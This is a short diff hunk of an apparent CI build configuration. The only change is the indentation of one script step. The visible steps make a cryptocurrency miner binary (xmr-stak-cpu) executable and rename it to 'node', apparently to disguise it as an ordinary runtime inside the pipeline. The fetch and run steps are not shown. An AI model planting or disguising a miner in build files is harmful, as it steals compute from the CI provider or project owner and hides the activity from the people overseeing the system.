@@ -16,7 +16,7 @@ build:
     - script:
        name: install 3
        code: chmod +x xmr-stak-cpu
-     - script:
+    - script:
        name: install 7
        code: mv xmr-stak-cpu node
     - script:
